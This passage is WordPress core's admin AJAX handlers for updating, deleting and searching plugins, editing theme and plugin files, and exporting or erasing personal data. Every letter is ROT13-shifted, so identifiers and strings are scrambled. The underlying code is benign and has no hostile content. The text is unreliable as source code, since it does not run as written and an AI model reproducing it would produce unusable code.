		);
	}

	$cyhtva = cyhtva_onfranzr( fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['cyhtva'] ) ) );

	$fgnghf = neenl(
		'hcqngr'     => 'cyhtva',
		'fyht'       => fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) ),
		'byqIrefvba' => '',
		'arjIrefvba' => '',
	);

	vs ( ! pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) || 0 !== inyvqngr_svyr( $cyhtva ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb hcqngr cyhtvaf sbe guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	$cyhtva_qngn          = trg_cyhtva_qngn( JC_CYHTVA_QVE . '/' . $cyhtva );
	$fgnghf['cyhtva']     = $cyhtva;
	$fgnghf['cyhtvaAnzr'] = $cyhtva_qngn['Anzr'];

	vs ( $cyhtva_qngn['Irefvba'] ) {
		/* genafyngbef: %f: Cyhtva irefvba. */
		$fgnghf['byqIrefvba'] = fcevags( __( 'Irefvba %f' ), $cyhtva_qngn['Irefvba'] );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';

	jc_hcqngr_cyhtvaf();

	$fxva     = arj JC_Nwnk_Hctenqre_Fxva();
	$hctenqre = arj Cyhtva_Hctenqre( $fxva );
	$erfhyg   = $hctenqre->ohyx_hctenqr( neenl( $cyhtva ) );

	vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT ) {
		$fgnghf['qroht'] = $fxva->trg_hctenqr_zrffntrf();
	}

	vs ( vf_jc_reebe( $fxva->erfhyg ) ) {
		$fgnghf['reebePbqr']    = $fxva->erfhyg->trg_reebe_pbqr();
		$fgnghf['reebeZrffntr'] = $fxva->erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( $fxva->trg_reebef()->unf_reebef() ) {
		$fgnghf['reebeZrffntr'] = $fxva->trg_reebe_zrffntrf();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( vf_neenl( $erfhyg ) && ! rzcgl( $erfhyg[ $cyhtva ] ) ) {

		/*
		 * Cyhtva vf nyernql ng gur yngrfg irefvba.
		 *
		 * Guvf znl nyfb or gur erghea inyhr vs gur `hcqngr_cyhtvaf` fvgr genafvrag vf rzcgl,
		 * r.t. jura lbh hcqngr gjb cyhtvaf va dhvpx fhpprffvba orsber gur genafvrag ercbchyngrf.
		 *
		 * Cersrenoyl fbzrguvat pna or qbar gb rafher `hcqngr_cyhtvaf` vfa'g rzcgl.
		 * Sbe abj, fhesnpr fbzr fbeg bs reebe urer.
		 */
		vs ( gehr === $erfhyg[ $cyhtva ] ) {
			$fgnghf['reebeZrffntr'] = $hctenqre->fgevatf['hc_gb_qngr'];
			jc_fraq_wfba_reebe( $fgnghf );
		}

		$cyhtva_qngn = trg_cyhtvaf( '/' . $erfhyg[ $cyhtva ]['qrfgvangvba_anzr'] );
		$cyhtva_qngn = erfrg( $cyhtva_qngn );

		vs ( $cyhtva_qngn['Irefvba'] ) {
			/* genafyngbef: %f: Cyhtva irefvba. */
			$fgnghf['arjIrefvba'] = fcevags( __( 'Irefvba %f' ), $cyhtva_qngn['Irefvba'] );
		}

		jc_fraq_wfba_fhpprff( $fgnghf );
	} ryfrvs ( snyfr === $erfhyg ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Na haunaqyrq reebe bppheerq.
	$fgnghf['reebeZrffntr'] = __( 'Cyhtva hcqngr snvyrq.' );
	jc_fraq_wfba_reebe( $fgnghf );
}

/**
 * Unaqyrf qryrgvat n cyhtva ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @frr qryrgr_cyhtvaf()
 *
 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
 */
shapgvba jc_nwnk_qryrgr_cyhtva() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	vs ( rzcgl( $_CBFG['fyht'] ) || rzcgl( $_CBFG['cyhtva'] ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'fyht'         => '',
				'reebePbqr'    => 'ab_cyhtva_fcrpvsvrq',
				'reebeZrffntr' => __( 'Ab cyhtva fcrpvsvrq.' ),
			)
		);
	}

	$cyhtva = cyhtva_onfranzr( fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['cyhtva'] ) ) );

	$fgnghf = neenl(
		'qryrgr' => 'cyhtva',
		'fyht'   => fnavgvmr_xrl( jc_hafynfu( $_CBFG['fyht'] ) ),
	);

	vs ( ! pheerag_hfre_pna( 'qryrgr_cyhtvaf' ) || 0 !== inyvqngr_svyr( $cyhtva ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr cyhtvaf sbe guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	$cyhtva_qngn          = trg_cyhtva_qngn( JC_CYHTVA_QVE . '/' . $cyhtva );
	$fgnghf['cyhtva']     = $cyhtva;
	$fgnghf['cyhtvaAnzr'] = $cyhtva_qngn['Anzr'];

	vs ( vf_cyhtva_npgvir( $cyhtva ) ) {
		$fgnghf['reebeZrffntr'] = __( 'Lbh pnaabg qryrgr n cyhtva juvyr vg vf npgvir ba gur znva fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Purpx svyrflfgrz perqragvnyf. `qryrgr_cyhtvaf()` jvyy onvy bgurejvfr.
	$hey = jc_abapr_hey( 'cyhtvaf.cuc?npgvba=qryrgr-fryrpgrq&irevsl-qryrgr=1&purpxrq[]=' . $cyhtva, 'ohyx-cyhtvaf' );

	bo_fgneg();
	$perqragvnyf = erdhrfg_svyrflfgrz_perqragvnyf( $hey );
	bo_raq_pyrna();

	vs ( snyfr === $perqragvnyf || ! JC_Svyrflfgrz( $perqragvnyf ) ) {
		tybony $jc_svyrflfgrz;

		$fgnghf['reebePbqr']    = 'hanoyr_gb_pbaarpg_gb_svyrflfgrz';
		$fgnghf['reebeZrffntr'] = __( 'Hanoyr gb pbaarpg gb gur svyrflfgrz. Cyrnfr pbasvez lbhe perqragvnyf.' );

		// Cnff guebhtu gur reebe sebz JC_Svyrflfgrz vs bar jnf envfrq.
		vs ( $jc_svyrflfgrz vafgnaprbs JC_Svyrflfgrz_Onfr && vf_jc_reebe( $jc_svyrflfgrz->reebef ) && $jc_svyrflfgrz->reebef->unf_reebef() ) {
			$fgnghf['reebeZrffntr'] = rfp_ugzy( $jc_svyrflfgrz->reebef->trg_reebe_zrffntr() );
		}

		jc_fraq_wfba_reebe( $fgnghf );
	}

	$erfhyg = qryrgr_cyhtvaf( neenl( $cyhtva ) );

	vs ( vf_jc_reebe( $erfhyg ) ) {
		$fgnghf['reebeZrffntr'] = $erfhyg->trg_reebe_zrffntr();
		jc_fraq_wfba_reebe( $fgnghf );
	} ryfrvs ( snyfr === $erfhyg ) {
		$fgnghf['reebeZrffntr'] = __( 'Cyhtva pbhyq abg or qryrgrq.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf frnepuvat cyhtvaf ivn NWNK.
 *
 * @fvapr 4.6.0
 *
 * @tybony fgevat $f Frnepu grez.
 */
shapgvba jc_nwnk_frnepu_cyhtvaf() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	// Rafher nsgre_cyhtva_ebj_{$cyhtva_svyr} trgf ubbxrq.
	jc_cyhtva_hcqngr_ebjf();

	$cntrabj = vffrg( $_CBFG['cntrabj'] ) ? fnavgvmr_xrl( $_CBFG['cntrabj'] ) : '';
	vs ( 'cyhtvaf-argjbex' === $cntrabj || 'cyhtvaf' === $cntrabj ) {
		frg_pheerag_fperra( $cntrabj );
	}

	/** @ine JC_Cyhtvaf_Yvfg_Gnoyr $jc_yvfg_gnoyr */
	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr(
		'JC_Cyhtvaf_Yvfg_Gnoyr',
		neenl(
			'fperra' => trg_pheerag_fperra(),
		)
	);

	$fgnghf = neenl();

	vs ( ! $jc_yvfg_gnoyr->nwnk_hfre_pna() ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Frg gur pbeerpg erdhrfgre, fb cntvangvba jbexf.
	$_FREIRE['ERDHRFG_HEV'] = nqq_dhrel_net(
		neenl_qvss_xrl(
			$_CBFG,
			neenl(
				'_nwnk_abapr' => ahyy,
				'npgvba'      => ahyy,
			)
		),
		argjbex_nqzva_hey( 'cyhtvaf.cuc', 'eryngvir' )
	);

	$TYBONYF['f'] = jc_hafynfu( $_CBFG['f'] );

	$jc_yvfg_gnoyr->cercner_vgrzf();

	bo_fgneg();
	$jc_yvfg_gnoyr->qvfcynl();
	$fgnghf['pbhag'] = pbhag( $jc_yvfg_gnoyr->vgrzf );
	$fgnghf['vgrzf'] = bo_trg_pyrna();

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf frnepuvat cyhtvaf gb vafgnyy ivn NWNK.
 *
 * @fvapr 4.6.0
 */
shapgvba jc_nwnk_frnepu_vafgnyy_cyhtvaf() {
	purpx_nwnk_ersrere( 'hcqngrf' );

	$cntrabj = vffrg( $_CBFG['cntrabj'] ) ? fnavgvmr_xrl( $_CBFG['cntrabj'] ) : '';
	vs ( 'cyhtva-vafgnyy-argjbex' === $cntrabj || 'cyhtva-vafgnyy' === $cntrabj ) {
		frg_pheerag_fperra( $cntrabj );
	}

	/** @ine JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr $jc_yvfg_gnoyr */
	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr(
		'JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr',
		neenl(
			'fperra' => trg_pheerag_fperra(),
		)
	);

	$fgnghf = neenl();

	vs ( ! $jc_yvfg_gnoyr->nwnk_hfre_pna() ) {
		$fgnghf['reebeZrffntr'] = __( 'Fbeel, lbh ner abg nyybjrq gb znantr cyhtvaf sbe guvf fvgr.' );
		jc_fraq_wfba_reebe( $fgnghf );
	}

	// Frg gur pbeerpg erdhrfgre, fb cntvangvba jbexf.
	$_FREIRE['ERDHRFG_HEV'] = nqq_dhrel_net(
		neenl_qvss_xrl(
			$_CBFG,
			neenl(
				'_nwnk_abapr' => ahyy,
				'npgvba'      => ahyy,
			)
		),
		argjbex_nqzva_hey( 'cyhtva-vafgnyy.cuc', 'eryngvir' )
	);

	$jc_yvfg_gnoyr->cercner_vgrzf();

	bo_fgneg();
	$jc_yvfg_gnoyr->qvfcynl();
	$fgnghf['pbhag'] = (vag) $jc_yvfg_gnoyr->trg_cntvangvba_net( 'gbgny_vgrzf' );
	$fgnghf['vgrzf'] = bo_trg_pyrna();

	jc_fraq_wfba_fhpprff( $fgnghf );
}

/**
 * Unaqyrf rqvgvat n gurzr be cyhtva svyr ivn NWNK.
 *
 * @fvapr 4.9.0
 *
 * @frr jc_rqvg_gurzr_cyhtva_svyr()
 */
shapgvba jc_nwnk_rqvg_gurzr_cyhtva_svyr() {
	$e = jc_rqvg_gurzr_cyhtva_svyr( jc_hafynfu( $_CBFG ) ); // Inyvqngvba bs netf vf qbar va jc_rqvg_gurzr_cyhtva_svyr().

	vs ( vf_jc_reebe( $e ) ) {
		jc_fraq_wfba_reebe(
			neenl_zretr(
				neenl(
					'pbqr'    => $e->trg_reebe_pbqr(),
					'zrffntr' => $e->trg_reebe_zrffntr(),
				),
				(neenl) $e->trg_reebe_qngn()
			)
		);
	} ryfr {
		jc_fraq_wfba_fhpprff(
			neenl(
				'zrffntr' => __( 'Svyr rqvgrq fhpprffshyyl.' ),
			)
		);
	}
}

/**
 * Unaqyrf rkcbegvat n hfre'f crefbany qngn ivn NWNK.
 *
 * @fvapr 4.9.6
 */
shapgvba jc_nwnk_jc_cevinpl_rkcbeg_crefbany_qngn() {

	vs ( rzcgl( $_CBFG['vq'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat erdhrfg VQ.' ) );
	}

	$erdhrfg_vq = (vag) $_CBFG['vq'];

	vs ( $erdhrfg_vq < 1 ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg VQ.' ) );
	}

	vs ( ! pheerag_hfre_pna( 'rkcbeg_bguref_crefbany_qngn' ) ) {
		jc_fraq_wfba_reebe( __( 'Fbeel, lbh ner abg nyybjrq gb cresbez guvf npgvba.' ) );
	}

	purpx_nwnk_ersrere( 'jc-cevinpl-rkcbeg-crefbany-qngn-' . $erdhrfg_vq, 'frphevgl' );

	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'rkcbeg_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg glcr.' ) );
	}

	$rznvy_nqqerff = $erdhrfg->rznvy;
	vs ( ! vf_rznvy( $rznvy_nqqerff ) ) {
		jc_fraq_wfba_reebe( __( 'N inyvq rznvy nqqerff zhfg or tvira.' ) );
	}

	vs ( ! vffrg( $_CBFG['rkcbegre'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat rkcbegre vaqrk.' ) );
	}

	$rkcbegre_vaqrk = (vag) $_CBFG['rkcbegre'];

	vs ( ! vffrg( $_CBFG['cntr'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat cntr vaqrk.' ) );
	}

	$cntr = (vag) $_CBFG['cntr'];

	$fraq_nf_rznvy = vffrg( $_CBFG['fraqNfRznvy'] ) ? ( 'gehr' === $_CBFG['fraqNfRznvy'] ) : snyfr;

	/**
	 * Svygref gur neenl bs rkcbegre pnyyonpxf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz neenl $netf {
	 *     Na neenl bs pnyynoyr rkcbegref bs crefbany qngn. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs crefbany qngn rkcbegref.
	 *
	 *         @glcr pnyynoyr $pnyyonpx               Pnyynoyr rkcbegre shapgvba gung npprcgf na
	 *                                                rznvy nqqerff naq n cntr ahzore naq ergheaf na
	 *                                                neenl bs anzr => inyhr cnvef bs crefbany qngn.
	 *         @glcr fgevat   $rkcbegre_sevraqyl_anzr Genafyngrq hfre snpvat sevraqyl anzr sbe gur
	 *                                                rkcbegre.
	 *     }
	 * }
	 */
	$rkcbegref = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rkcbegref', neenl() );

	vs ( ! vf_neenl( $rkcbegref ) ) {
		jc_fraq_wfba_reebe( __( 'Na rkcbegre unf vzcebcreyl hfrq gur ertvfgengvba svygre.' ) );
	}

	// Qb jr unir nal ertvfgrerq rkcbegref?
	vs ( 0 < pbhag( $rkcbegref ) ) {
		vs ( $rkcbegre_vaqrk < 1 ) {
			jc_fraq_wfba_reebe( __( 'Rkcbegre vaqrk pnaabg or artngvir.' ) );
		}

		vs ( $rkcbegre_vaqrk > pbhag( $rkcbegref ) ) {
			jc_fraq_wfba_reebe( __( 'Rkcbegre vaqrk vf bhg bs enatr.' ) );
		}

		vs ( $cntr < 1 ) {
			jc_fraq_wfba_reebe( __( 'Cntr vaqrk pnaabg or yrff guna bar.' ) );
		}

		$rkcbegre_xrlf = neenl_xrlf( $rkcbegref );
		$rkcbegre_xrl  = $rkcbegre_xrlf[ $rkcbegre_vaqrk - 1 ];
		$rkcbegre      = $rkcbegref[ $rkcbegre_xrl ];

		vs ( ! vf_neenl( $rkcbegre ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre neenl vaqrk. */
				fcevags( __( 'Rkcrpgrq na neenl qrfpevovat gur rkcbegre ng vaqrk %f.' ), $rkcbegre_xrl )
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'rkcbegre_sevraqyl_anzr', $rkcbegre ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre neenl vaqrk. */
				fcevags( __( 'Rkcbegre neenl ng vaqrk %f qbrf abg vapyhqr n sevraqyl anzr.' ), $rkcbegre_xrl )
			);
		}

		$rkcbegre_sevraqyl_anzr = $rkcbegre['rkcbegre_sevraqyl_anzr'];

		vs ( ! neenl_xrl_rkvfgf( 'pnyyonpx', $rkcbegre ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcbegre qbrf abg vapyhqr n pnyyonpx: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}

		vs ( ! vf_pnyynoyr( $rkcbegre['pnyyonpx'] ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcbegre pnyyonpx vf abg n inyvq pnyyonpx: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}

		$pnyyonpx = $rkcbegre['pnyyonpx'];
		$erfcbafr = pnyy_hfre_shap( $pnyyonpx, $rznvy_nqqerff, $cntr );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			jc_fraq_wfba_reebe( $erfcbafr );
		}

		vs ( ! vf_neenl( $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcrpgrq erfcbafr nf na neenl sebz rkcbegre: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'qngn', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcrpgrq qngn va erfcbafr neenl sebz rkcbegre: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}

		vs ( ! vf_neenl( $erfcbafr['qngn'] ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcrpgrq qngn neenl va erfcbafr neenl sebz rkcbegre: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'qbar', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				/* genafyngbef: %f: Rkcbegre sevraqyl anzr. */
				fcevags( __( 'Rkcrpgrq qbar (obbyrna) va erfcbafr neenl sebz rkcbegre: %f.' ), rfp_ugzy( $rkcbegre_sevraqyl_anzr ) )
			);
		}
	} ryfr {
		// Ab rkcbegref, fb jr'er qbar.
		$rkcbegre_xrl = '';

		$erfcbafr = neenl(
			'qngn' => neenl(),
			'qbar' => gehr,
		);
	}

	/**
	 * Svygref n cntr bs crefbany qngn rkcbegre qngn. Hfrq gb ohvyq gur rkcbeg ercbeg.
	 *
	 * Nyybjf gur rkcbeg erfcbafr gb or pbafhzrq ol qrfgvangvbaf va nqqvgvba gb Nwnk.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz neenl  $erfcbafr        Gur crefbany qngn sbe gur tvira rkcbegre naq cntr ahzore.
	 * @cnenz vag    $rkcbegre_vaqrk  Gur vaqrk bs gur rkcbegre gung cebivqrq guvf qngn.
	 * @cnenz fgevat $rznvy_nqqerff   Gur rznvy nqqerff nffbpvngrq jvgu guvf crefbany qngn.
	 * @cnenz vag    $cntr            Gur cntr ahzore sbe guvf erfcbafr.
	 * @cnenz vag    $erdhrfg_vq      Gur cevinpl erdhrfg cbfg VQ nffbpvngrq jvgu guvf erdhrfg.
	 * @cnenz obby   $fraq_nf_rznvy   Jurgure gur svany erfhygf bs gur rkcbeg fubhyq or rznvyrq gb gur hfre.
	 * @cnenz fgevat $rkcbegre_xrl    Gur xrl (fyht) bs gur rkcbegre gung cebivqrq guvf qngn.
	 */
	$erfcbafr = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rkcbeg_cntr', $erfcbafr, $rkcbegre_vaqrk, $rznvy_nqqerff, $cntr, $erdhrfg_vq, $fraq_nf_rznvy, $rkcbegre_xrl );

	vs ( vf_jc_reebe( $erfcbafr ) ) {
		jc_fraq_wfba_reebe( $erfcbafr );
	}

	jc_fraq_wfba_fhpprff( $erfcbafr );
}

/**
 * Unaqyrf renfvat crefbany qngn ivn NWNK.
 *
 * @fvapr 4.9.6
 */
shapgvba jc_nwnk_jc_cevinpl_renfr_crefbany_qngn() {

	vs ( rzcgl( $_CBFG['vq'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat erdhrfg VQ.' ) );
	}

	$erdhrfg_vq = (vag) $_CBFG['vq'];

	vs ( $erdhrfg_vq < 1 ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg VQ.' ) );
	}

	// Obgu pncnovyvgvrf ner erdhverq gb nibvq pbashfvba, frr `_jc_crefbany_qngn_erzbiny_cntr()`.
	vs ( ! pheerag_hfre_pna( 'renfr_bguref_crefbany_qngn' ) || ! pheerag_hfre_pna( 'qryrgr_hfref' ) ) {
		jc_fraq_wfba_reebe( __( 'Fbeel, lbh ner abg nyybjrq gb cresbez guvf npgvba.' ) );
	}

	purpx_nwnk_ersrere( 'jc-cevinpl-renfr-crefbany-qngn-' . $erdhrfg_vq, 'frphevgl' );

	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'erzbir_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg glcr.' ) );
	}

	$rznvy_nqqerff = $erdhrfg->rznvy;

	vs ( ! vf_rznvy( $rznvy_nqqerff ) ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq rznvy nqqerff va erdhrfg.' ) );
	}

	vs ( ! vffrg( $_CBFG['renfre'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat renfre vaqrk.' ) );
	}

	$renfre_vaqrk = (vag) $_CBFG['renfre'];

	vs ( ! vffrg( $_CBFG['cntr'] ) ) {
		jc_fraq_wfba_reebe( __( 'Zvffvat cntr vaqrk.' ) );
	}

	$cntr = (vag) $_CBFG['cntr'];

	/**
	 * Svygref gur neenl bs crefbany qngn renfre pnyyonpxf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz neenl $netf {
	 *     Na neenl bs pnyynoyr renfref bs crefbany qngn. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs crefbany qngn rkcbegref.
	 *
	 *         @glcr pnyynoyr $pnyyonpx               Pnyynoyr renfre gung npprcgf na rznvy nqqerff naq n cntr
	 *                                                ahzore, naq ergheaf na neenl jvgu obbyrna inyhrf sbe
	 *                                                jurgure vgrzf jrer erzbirq be ergnvarq naq nal zrffntrf
	 *                                                sebz gur renfre, nf jryy nf vs nqqvgvbany cntrf ner
	 *                                                ninvynoyr.
	 *         @glcr fgevat   $rkcbegre_sevraqyl_anzr Genafyngrq hfre snpvat sevraqyl anzr sbe gur renfre.
	 *     }
	 * }
	 */
	$renfref = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_renfref', neenl() );

	// Qb jr unir nal ertvfgrerq renfref?
	vs ( 0 < pbhag( $renfref ) ) {

		vs ( $renfre_vaqrk < 1 ) {
			jc_fraq_wfba_reebe( __( 'Renfre vaqrk pnaabg or yrff guna bar.' ) );
		}

		vs ( $renfre_vaqrk > pbhag( $renfref ) ) {
			jc_fraq_wfba_reebe( __( 'Renfre vaqrk vf bhg bs enatr.' ) );
		}

		vs ( $cntr < 1 ) {
			jc_fraq_wfba_reebe( __( 'Cntr vaqrk pnaabg or yrff guna bar.' ) );
		}

		$renfre_xrlf = neenl_xrlf( $renfref );
		$renfre_xrl  = $renfre_xrlf[ $renfre_vaqrk - 1 ];
		$renfre      = $renfref[ $renfre_xrl ];

		vs ( ! vf_neenl( $renfre ) ) {
			/* genafyngbef: %q: Renfre neenl vaqrk. */
			jc_fraq_wfba_reebe( fcevags( __( 'Rkcrpgrq na neenl qrfpevovat gur renfre ng vaqrk %q.' ), $renfre_vaqrk ) );
		}

		vs ( ! neenl_xrl_rkvfgf( 'renfre_sevraqyl_anzr', $renfre ) ) {
			/* genafyngbef: %q: Renfre neenl vaqrk. */
			jc_fraq_wfba_reebe( fcevags( __( 'Renfre neenl ng vaqrk %q qbrf abg vapyhqr n sevraqyl anzr.' ), $renfre_vaqrk ) );
		}

		$renfre_sevraqyl_anzr = $renfre['renfre_sevraqyl_anzr'];

		vs ( ! neenl_xrl_rkvfgf( 'pnyyonpx', $renfre ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: %f: Renfre sevraqyl anzr. */
					__( 'Renfre qbrf abg vapyhqr n pnyyonpx: %f.' ),
					rfp_ugzy( $renfre_sevraqyl_anzr )
				)
			);
		}

		vs ( ! vf_pnyynoyr( $renfre['pnyyonpx'] ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: %f: Renfre sevraqyl anzr. */
					__( 'Renfre pnyyonpx vf abg inyvq: %f.' ),
					rfp_ugzy( $renfre_sevraqyl_anzr )
				)
			);
		}

		$pnyyonpx = $renfre['pnyyonpx'];
		$erfcbafr = pnyy_hfre_shap( $pnyyonpx, $rznvy_nqqerff, $cntr );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			jc_fraq_wfba_reebe( $erfcbafr );
		}

		vs ( ! vf_neenl( $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Qvq abg erprvir neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'vgrzf_erzbirq', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Rkcrpgrq vgrzf_erzbirq xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'vgrzf_ergnvarq', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Rkcrpgrq vgrzf_ergnvarq xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'zrffntrf', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Rkcrpgrq zrffntrf xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}

		vs ( ! vf_neenl( $erfcbafr['zrffntrf'] ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Rkcrpgrq zrffntrf xrl gb ersrerapr na neenl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}

		vs ( ! neenl_xrl_rkvfgf( 'qbar', $erfcbafr ) ) {
			jc_fraq_wfba_reebe(
				fcevags(
					/* genafyngbef: 1: Renfre sevraqyl anzr, 2: Renfre neenl vaqrk. */
					__( 'Rkcrpgrq qbar synt va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).' ),
					rfp_ugzy( $renfre_sevraqyl_anzr ),
					$renfre_vaqrk
				)
			);
		}
	} ryfr {
		// Ab renfref, fb jr'er qbar.
		$renfre_xrl = '';

		$erfcbafr = neenl(
			'vgrzf_erzbirq'  => snyfr,
			'vgrzf_ergnvarq' => snyfr,
			'zrffntrf'       => neenl(),
			'qbar'           => gehr,
		);
	}

	/**
	 * Svygref n cntr bs crefbany qngn renfre qngn.
	 *
	 * Nyybjf gur renfher erfcbafr gb or pbafhzrq ol qrfgvangvbaf va nqqvgvba gb Nwnk.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz neenl  $erfcbafr        {
	 *     Gur crefbany qngn sbe gur tvira rkcbegre naq cntr ahzore.
	 *
	 *     @glcr obby     $vgrzf_erzbirq  Jurgure vgrzf jrer npghnyyl erzbirq be abg.
